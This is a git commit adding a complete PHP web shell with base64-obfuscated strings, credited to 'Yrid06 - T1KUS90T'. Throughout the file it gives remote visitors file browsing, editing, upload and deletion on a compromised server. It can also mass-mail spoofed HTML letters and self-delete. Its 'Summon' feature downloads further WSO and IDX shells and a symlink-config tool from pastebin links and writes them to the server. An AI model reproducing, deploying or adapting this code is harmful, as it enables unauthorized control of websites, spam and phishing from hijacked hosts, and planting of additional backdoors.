e9054bf3bcd351163566d5c3cf4ec7431fa47ec6
Rommy <85510468+nus1x@users.noreply.github.com>
2023-02-07 11:26:07 +0700

    Create yrid06.php

---
+++ yrid06.php
@@ -0,0 +1,94 @@
+<html>
+<head>
+<title>Yrid06</title>
+<style type="text/css">
+@import url('https://fonts.googleapis.com/css?family=Courier');
+body {
+	background-color: black;
+	font-family: Courier;
+	color: white;
+}
+
+input[type=text] {
+	background-color: transparent;
+	border: 1px dotted #ffa502;
+	color: white;
+	padding-left: 5px;
+	outline: none;
+	width: 13.3%;
+	margin-bottom: 5px;
+}
+
+input[type=submit] {
+	background-color: transparent;
+	border: 1px dotted #ffa502;
+	color: white;
+	cursor: pointer;
+	margin-left: 2px;
+	outline: none;
+}
+
+button {
+	background-color: transparent;
+	border: 1px dotted #ffa502;
+	color: white;
+	cursor: pointer;
+	margin-top: 5px;
+	width: 85px;
+	outline: none;
+	margin-bottom: 5px;
+}
+
+a {
+	text-decoration: none;
+	color: white;
+}
+
+textarea {
+	width: 40%;
+	height: 400px;
+	background-color: transparent;
+	border: 1px dotted #ffa502;
+	color: white;
+	outline: none;
+}
+
+.endec {
+	width: 17.5%;
+	height: 50px;
+}
+
+.mailer {
+	width: 19.7%;
+	height: 100px;
+	margin-top: 5px;
+	margin-bottom: 5px;
+}
+
+select {
+	background-color: transparent;
+	border: 1px dotted #ffa502;
+	cursor: pointer;
+	outline: none;
+	color: gray;
+	width: 8.7%;
+}
+</style>
+</head>
+
+<body>
+<?php #####################################
+#									#
+# 	Coded by Yrid06 - T1KUS90T		#
+# fb.com/iamkuja - fb.com/T1KUS90T	#
+#									#
+#####################################
+ $k0=$_SERVER[base64_decode('SFRUUF9IT1NU')];$n1=$_GET[base64_decode('ZGly')];$s2=explode(base64_decode('Lw=='),$n1);$f3=getcwd();echo base64_decode('PHByZT48Zm9udCBjb2xvcj0nI2ZmYTUwMic+');echo base64_decode('X18gICBfXyAgICBfICAgICBfICBfX18gICBfXyAgIA0KICAvIC8gX18oXykgX198IHwvIF8gIC8gL18gIA0KICBWIC8gJ19ffCB8LyBfYCB8IHwgfCB8ICdfICANCiAgfCB8fCB8ICB8IHwgKF98IHwgfF98IHwgKF8pIHwNCiAgfF98fF98ICB8X3xfXyxffF9fXy8gX19fLyA=');echo base64_decode('PC9mb250PjwvcHJlPg==');echo base64_decode('SVA6IDxmb250IGNvbG9yPScjZmZhNTAyJz4=').gethostbyname($k0).base64_decode('PC9mb250Pjxicj4=');echo"Website: <font color='#ffa502'>$k0</font><br>";echo"Jump to File: <font color='#ffa502'>[ <a href='?dir=$f3'>HOME</a> ]</font><br>";echo base64_decode('Q3VycmVudCBEaXJlY3Rvcnk6IDxmb250IGNvbG9yPScjZmZhNTAyJz4=');foreach($s2 as $g4=>$j5){echo base64_decode('PGEgaHJlZj0nP2Rpcj0=');for($q6=0;$q6<=$g4;$q6++){echo $s2[$q6];if($q6!=$g4){echo base64_decode('Lw==');}}echo"'>$j5</a>/";}if($_GET[base64_decode('ZGly')]){$s2=$_GET[base64_decode('ZGly')];chdir($s2);}else{$s2=getcwd();}echo base64_decode('PGJyPjxhIGhyZWY9Jz90b29scz1jbWQnPjxidXR0b24+Q29tbWFuZDwvYnV0dG9uPjwvYT4gPGEgaHJlZj0nP3VwPQ==').$s2.base64_decode('JnRvb2xzPXVwbCc+PGJ1dHRvbj5VcGxvYWQ8L2J1dHRvbj48L2E+IDxhIGhyZWY9Jz90b29scz1tYWlsZXInPjxidXR0b24+TWFpbGVyPC9idXR0b24+PC9hPiA8YSBocmVmPSc/dG9vbHM9ZW5kZWMnPjxidXR0b24+RU4vREVDPC9idXR0b24+PC9hPjxicj48YSBocmVmPSc/bmV3Zj0=').$s2.base64_decode('JnRvb2xzPW5ld2ZpbGUnPjxidXR0b24+TmV3IEZpbGU8L2J1dHRvbj48L2E+IDxhIGhyZWY9Jz9uZXdkPQ==').$s2.base64_decode('JnRvb2xzPW5ld2Rpcic+PGJ1dHRvbj5OZXcgRm9sZGVyPC9idXR0b24+PC9hPiA8YSBocmVmPSc/c209').$s2.base64_decode('JnRvb2xzPXN1bW1vbic+PGJ1dHRvbj5TdW1tb248L2J1dHRvbj48L2E+IDxhIGhyZWY9Jz90b29scz1kZXN0cm95Jz48YnV0dG9uPjxmb250IGNvbG9yPScjZDYzMDMxJz5EZXN0cm95PC9mb250PjwvYnV0dG9uPjwvYT4=');if($_GET[base64_decode('dG9vbHM=')]==base64_decode('ZGVzdHJveQ==')){$q7=basename($_SERVER[base64_decode('UEhQX1NFTEY=')]);unlink($q7);}elseif($_GET[base64_decode('dG9vbHM=')]==base64_decode('c3VtbW9u')){$f8=$_GET[base64_decode('c20=')];echo base64_decode('PGJyPjxicj48Zm9ybSBtZXRob2Q9J3Bvc3QnPg0KCTxzZWxlY3QgbmFtZT0nbGlzdCc+DQoJPG9wdGlvbiB2YWx1ZT0nd3NvJz5XU08gU0hFTEw8L29wdGlvbj4NCgk8b3B0aW9uIHZhbHVlPSdpZHgnPklEWCBTSEVMTDwvb3B0aW9uPg0KCTxvcHRpb24gdmFsdWU9J3N5bSc+U3ltbGluayBDb25maWc8L29wdGlvbj4NCgk8aW5wdXQgdHlwZT0nc3VibWl0JyBuYW1lPSdzdWJtaXQnIHZhbHVlPSdTdW1tb24hJz48L2Zvcm0+');if($_POST[base64_decode('c3VibWl0')]){$h9=$_POST[base64_decode('bGlzdA==')];if($h9==base64_decode('d3Nv')){$ma=file_put_contents("$f8/wso.php",file_get_contents(base64_decode('aHR0cDovL3Bhc3RlYmluLmNvbS9yYXcvdXVXVzVUQ1k=')));if($ma){echo base64_decode('PGZvbnQgY29sb3I9J3doaXRlJz5TdW1tb24gU3VjY2VzczwvZm9udD4gd3NvLnBocCE=');}else{echo base64_decode('U3VtbW9uIEZhaWxlZCE=');}}elseif($h9==base64_decode('aWR4')){$ma=file_put_contents("$f8/idx.php",file_get_contents(base64_decode('aHR0cDovL3Bhc3RlYmluLmNvbS9yYXcvblRBWnIyTVk=')));if($ma){echo base64_decode('PGZvbnQgY29sb3I9J3doaXRlJz5TdW1tb24gU3VjY2VzczwvZm9udD4gaWR4LnBocCE=');}else{echo base64_decode('U3VtbW9uIEZhaWxlZCE=');}}elseif($h9==base64_decode('c3lt')){$ma=file_put_contents("$f8/sym.php",file_get_contents(base64_decode('aHR0cDovL3Bhc3RlYmluLmNvbS9yYXcvUFp2aWhNejg=')));if($ma){echo base64_decode('PGZvbnQgY29sb3I9J3doaXRlJz5TdW1tb24gU3VjY2VzczwvZm9udD4gc3ltLnBocCE=');}else{echo base64_decode('U3VtbW9uIEZhaWxlZCE=');}}}}elseif($_GET[base64_decode('dG9vbHM=')]==base64_decode('bWFpbGVy')){echo"<br><br><form method='post' enctype='multipart/form-data'><font color='white'>Sender:</font>&nbsp;&nbsp;<input type='text' name='sender' placeholder='Sender Name' value='tikusgot'><br><font color='white'>Email:</font>&nbsp;&nbsp;
+	<input type='text' name='eml' placeholder='Email' value='adm@$k0'><br>
+	<font color='white'>Subject:</font> 
+	<input type='text' name='sbj' placeholder='Subject' value='Warning!!!'><br>
+	<font color='white'>Letter:</font>&nbsp;&nbsp;<input type='file' name='letter'><br>
+	<textarea class='mailer' name='mailist' placeholder='Mailist'></textarea><br>
+	<input type='submit' style='margin-left: 0px;' name='submit' value='SEND!'></form>";if($_POST[base64_decode('c3VibWl0')]){$ob=$_POST[base64_decode('ZW1s')];$mc=$_POST[base64_decode('c2Jq')];$pd=$_POST[base64_decode('bWFpbGlzdA==')];$q7=$_FILES[base64_decode('bGV0dGVy')][base64_decode('bmFtZQ==')];@copy($_FILES[base64_decode('bGV0dGVy')][base64_decode('dG1wX25hbWU=')],$q7);$ce=file_get_contents($q7);$af=base64_decode('TUlNRS1WZXJzaW9uOiAxLjA=').base64_decode('DQo=');$af.=base64_decode('Q29udGVudC1UeXBlOiB0ZXh0L2h0bWw7IGNoYXJzZXQ9VVRGLTg=').base64_decode('DQo=');$af.=base64_decode('RnJvbTo=').$_POST[base64_decode('c2VuZGVy')].base64_decode('IDw=').$_POST[base64_decode('ZW1s')].base64_decode('Pg==');foreach(explode(base64_decode('DQo='),$pd)as $m10){$g11=mail($m10,$mc,$ce,$af);if($g11){echo base64_decode('Wzxmb250IGNvbG9yPSd3aGl0ZSc+WDwvZm9udD5dIA==').$m10.base64_decode('ID0+IDxmb250IGNvbG9yPSdncmVlbic+U0VOVCE8L2ZvbnQ+PGJyPg==');}else{echo base64_decode('Wzxmb250IGNvbG9yPSd3aGl0ZSc+WDwvZm9udD5dIA==').$m10.base64_decode('ID0+IDxmb250IGNvbG9yPSdyZWQnPkZBSUwhPC9mb250Pjxicj4=');}}}}elseif($_GET[base64_decode('dG9vbHM=')]==base64_decode('ZW5kZWM=')){echo base64_decode('PGJyPjxicj48YSBocmVmPSc/dG9vbHM9ZW5kZWMmbWVudT1lbmNvZGUnPjxidXR0b24+RW5jb2RlPC9idXR0b24+PC9hPiA8YSBocmVmPSc/dG9vbHM9ZW5kZWMmbWVudT1kZWNvZGUnPjxidXR0b24+RGVjb2RlPC9idXR0b24+PC9hPg==');if($_GET[base64_decode('bWVudQ==')]==base64_decode('ZW5jb2Rl')){echo base64_decode('PGZvcm0gbWV0aG9kPSdwb3N0Jz48aW5wdXQgdHlwZT0ndGV4dCcgbmFtZT0nc3RyaW5nJyBwbGFjZWhvbGRlcj0nVGV4dCB0byBlbmNvZGUnPjxpbnB1dCB0eXBlPSdzdWJtaXQnIG5hbWU9J3N1Ym1pdCcgdmFsdWU9J0VuY29kZSc+PC9mb3JtPg==');if($_POST[base64_decode('c3VibWl0')]){$d12=$_POST[base64_decode('c3RyaW5n')];$c13=bin2hex($d12);$c13=chunk_split($c13,2,base64_decode('JQ=='));$c13=base64_decode('JQ==').substr($c13,0,strlen($c13)-1);echo base64_decode('PGZvbnQgY29sb3I9J3doaXRlJz5CYXNlNjQ6PC9mb250Pjxicj48dGV4dGFyZWEgY2xhc3M9J2VuZGVjJyByZWFkb25seT4=').base64_encode($d12).base64_decode('PC90ZXh0YXJlYT4=');echo base64_decode('PGJyPjxicj48Zm9udCBjb2xvcj0nd2hpdGUnPlVybCBFbmNvZGU6PC9mb250Pjxicj48dGV4dGFyZWEgY2xhc3M9J2VuZGVjJyByZWFkb25seT4=').$c13.base64_decode('PC90ZXh0YXJlYT4=');echo base64_decode('PGJyPjxicj48Zm9udCBjb2xvcj0nd2hpdGUnPkhleDo8L2ZvbnQ+PGJyPjx0ZXh0YXJlYSBjbGFzcz0nZW5kZWMnIHJlYWRvbmx5Pg==').bin2hex($d12).base64_decode('PC90ZXh0YXJlYT4=');}}elseif($_GET[base64_decode('bWVudQ==')]==base64_decode('ZGVjb2Rl')){echo base64_decode('PGZvcm0gbWV0aG9kPSdwb3N0Jz48aW5wdXQgdHlwZT0ndGV4dCcgbmFtZT0nc3RyaW5nJyBwbGFjZWhvbGRlcj0nVGV4dCB0byBkZWNvZGUnPjxicj48c2VsZWN0IG5hbWU9J2RlYyc+PG9wdGlvbiB2YWx1ZT0nYmFzZTY0JyBzZWxlY3RlZD5CYXNlNjQ8L29wdGlvbj48b3B0aW9uIHZhbHVlPSd1cmwnPlVybCBFbmNvZGU8L29wdGlvbj48b3B0aW9uIHZhbHVlPSdoZXgnPkhleDwvb3B0aW9uPjxpbnB1dCB0eXBlPSdzdWJtaXQnIG5hbWU9J3N1Ym1pdCcgdmFsdWU9J0RlY29kZSc+PC9zZWxlY3Q+PC9mb3JtPg==');if($_POST[base64_decode('c3VibWl0')]){$d12=$_POST[base64_decode('c3RyaW5n')];$k14=$_POST[base64_decode('ZGVj')];if($k14==base64_decode('YmFzZTY0')){echo base64_decode('PGZvbnQgY29sb3I9J3doaXRlJz5SZXN1bHQ6PC9mb250Pjxicj48dGV4dGFyZWEgY2xhc3M9J2VuZGVjJyByZWFkb25seT4=').base64_decode($d12).base64_decode('PC90ZXh0YXJlYT4=');}elseif($k14==base64_decode('dXJs')){$o15=str_replace(base64_decode('JQ=='),'',$d12);echo base64_decode('PGZvbnQgY29sb3I9J3doaXRlJz5SZXN1bHQ6PC9mb250Pjxicj48dGV4dGFyZWEgY2xhc3M9J2VuZGVjJyByZWFkb25seT4=').hex2bin($o15).base64_decode('PC90ZXh0YXJlYT4=');}elseif($k14==base64_decode('aGV4')){echo base64_decode('PGZvbnQgY29sb3I9J3doaXRlJz5SZXN1bHQ6PC9mb250Pjxicj48dGV4dGFyZWEgY2xhc3M9J2VuZGVjJyByZWFkb25seT4=').hex2bin($d12).base64_decode('PC90ZXh0YXJlYT4=');}}}}elseif($_GET[base64_decode('dG9vbHM=')]==base64_decode('dXBs')){echo base64_decode('PGJyPjxicj48Zm9ybSBtZXRob2Q9J3Bvc3QnIGVuY3R5cGU9J211bHRpcGFydC9mb3JtLWRhdGEnPjxpbnB1dCB0eXBlPSdmaWxlJyBuYW1lPSdmaWxlcyc+PGlucHV0IHR5cGU9J3N1Ym1pdCcgdmFsdWU9J1VwbG9hZCEnIG5hbWU9J3VwbG9hZCc+PGZvcm0+');if($_POST[base64_decode('dXBsb2Fk')]){$s2=$_GET[base64_decode('dXA=')];$q7=$_FILES[base64_decode('ZmlsZXM=')][base64_decode('bmFtZQ==')];$t16=$_FILES[base64_decode('ZmlsZXM=')][base64_decode('dG1wX25hbWU=')];$x17=move_uploaded_file($t16,$s2.base64_decode('Lw==').$q7);if($x17){echo"<br><br><font color='white'>Success upload</font> $s2/$q7";}else{echo base64_decode('PGJyPjxicj5VcGxvYWQgZmFpbGVkIQ==');}}}elseif($_GET[base64_decode('dG9vbHM=')]==base64_decode('bmV3ZmlsZQ==')){$u18=$_GET[base64_decode('bmV3Zg==')];echo base64_decode('PGJyPjxicj48Zm9ybSBtZXRob2Q9J3Bvc3QnPjxmb250IGNvbG9yPSd3aGl0ZSc+RmlsZW5hbWU6PC9mb250PiA8aW5wdXQgdHlwZT0ndGV4dCcgbmFtZT0nZm5hbWUnIHZhbHVlPSdoYWNrLnBocCc+PGJyPjxicj48dGV4dGFyZWEgbmFtZT0nZmlzaSc+PC90ZXh0YXJlYT48YnI+PGJyPjxpbnB1dCB0eXBlPSdzdWJtaXQnIG5hbWU9J2NyZWF0ZScgdmFsdWU9J0NyZWF0ZSBGaWxlISc+PC9mb3JtPg==');if($_POST[base64_decode('Y3JlYXRl')]){$o19=$_POST[base64_decode('Zm5hbWU=')];$z1a=$_POST[base64_decode('ZmlzaQ==')];$b1b=fwrite(fopen($u18.base64_decode('Lw==').$o19,base64_decode('dw==')),$z1a);if(!file_exists($u18.base64_decode('Lw==').$o19)){echo base64_decode('IEZhaWxlZCB0byBjcmVhdGUgZmlsZSE=');}else{echo base64_decode('PHNjcmlwdD53aW5kb3cubG9jYXRpb24gPSc/ZGlyPQ==').$u18.base64_decode('Jzs8L3NjcmlwdD4=');}}}elseif($_GET[base64_decode('dG9vbHM=')]==base64_decode('bmV3ZGly')){$r1c=$_GET[base64_decode('bmV3ZA==')];echo base64_decode('PGJyPjxicj48Zm9ybSBtZXRob2Q9J3Bvc3QnPjxmb250IGNvbG9yPSd3aGl0ZSc+RGlyIE5hbWU6PC9mb250PiA8aW5wdXQgdHlwZT0ndGV4dCcgbmFtZT0nZGlybmFtZScgdmFsdWU9J2hhY2snPjxpbnB1dCB0eXBlPSdzdWJtaXQnIHZhbHVlPSdDcmVhdGUgRGlyIScgbmFtZT0nY3JlYXRlJz48L2Zvcm0+');if($_POST[base64_decode('Y3JlYXRl')]){$w1d=$_POST[base64_decode('ZGlybmFtZQ==')];$b1b=mkdir($r1c.base64_decode('Lw==').$w1d,0777);if(!$b1b){echo base64_decode('IEZhaWxlZCB0byBjcmVhdGUgZGlyIQ==');}else{echo base64_decode('PHNjcmlwdD53aW5kb3cubG9jYXRpb24gPSc/ZGlyPQ==').$r1c.base64_decode('Jzs8L3NjcmlwdD4=');}}}else{echo base64_decode('PGJyPg==');$h1e=scandir($s2);foreach($h1e as $e1f){if(!is_dir($e1f)){echo"<br><img src='http://icons.iconarchive.com/icons/zhoolego/material/512/Filetype-Docs-icon.png' width='20px' height='20px'> <a href='?dir=$s2&view=$e1f'>$e1f</a>";}else{echo"<br><img src='http://icons.iconarchive.com/icons/dakirby309/simply-styled/256/Blank-Folder-icon.png' width='20px' height='20px'> <a href=?dir=$s2/$e1f>$e1f</a>";}}}if($_GET[base64_decode('dmlldw==')]){$q7=$_GET[base64_decode('dmlldw==')];$j20=htmlspecialchars(file_get_contents($q7));echo"<br><br><font color='white'>Filename:</font> $q7<br><a href='?dir=$s2&view=$q7&act=edit'><button>EDIT</button></a> <a href='?dir=$s2&view=$q7&act=rename'><button>RENAME</button></a> <a href='?dir=$s2&view=$q7&act=delete'><button>DELETE</button></a><br><form method='post'><textarea name='filez'>".$j20.base64_decode('PC90ZXh0YXJlYT4=');if($_GET[base64_decode('YWN0')]==base64_decode('ZWRpdA==')){$f21=$_POST[base64_decode('ZmlsZXo=')];echo base64_decode('PGJyPjxicj48aW5wdXQgdHlwZT0nc3VibWl0JyBuYW1lPSdlZGl0JyB2YWx1ZT0nVXBkYXRlJz48L2Zvcm0+');if($_POST[base64_decode('ZWRpdA==')]){$z22=fwrite(fopen($q7,base64_decode('dw==')),$f21);if($z22){echo base64_decode('PHNjcmlwdD53aW5kb3cubG9jYXRpb24gPSc/ZGlyPQ==').$s2.base64_decode('Jzs8L3NjcmlwdD4=');}else{echo base64_decode('IEVkaXQgRmFpbGVkIQ==');}}}elseif($_GET[base64_decode('YWN0')]==base64_decode('cmVuYW1l')){echo"<br><br><form method='post'><input type='text' name='newname' value='$q7'><input type='submit' name='newnm' value='Rename'></form>";if($_POST[base64_decode('bmV3bm0=')]){$n23=$_POST[base64_decode('bmV3bmFtZQ==')];$z22=rename($q7,$n23);if($z22){unlink($q7);echo base64_decode('PHNjcmlwdD53aW5kb3cubG9jYXRpb24gPSc/ZGlyPQ==').$s2.base64_decode('Jzs8L3NjcmlwdD4=');}else{echo base64_decode('IFJlbmFtZSBGYWlsZWQh');}}}elseif($_GET[base64_decode('YWN0')]==base64_decode('ZGVsZXRl')){$q24=unlink($q7);if($q24){echo base64_decode('PHNjcmlwdD53aW5kb3cubG9jYXRpb24gPSc/ZGlyPQ==').$s2.base64_decode('Jzs8L3NjcmlwdD4=');}else{echo base64_decode('PGJyPjxicj5EZWxldGUgRmFpbGVkIQ==');}}}echo base64_decode('PGJyPjxicj48Zm9udCBmYWNlPSdjYWxpYnJpJz4mY29weTsgPC9mb250Pg==').date(base64_decode('WQ==')).base64_decode('IDxhIGhyZWY9J2h0dHA6Ly9mYi5jb20vWXJpZDA2JyB0YXJnZXQ9J19ibGFuayc+WXJpZDA2PC9hPiAtIDxhIGhyZWY9J2h0dHA6Ly9mYi5jb20vVDFLVVM5MFQnIHRhcmdldD0nX2JsYW5rJz5UMUtVUzkwVDwvYT4u');?>
+</body>
+</html>
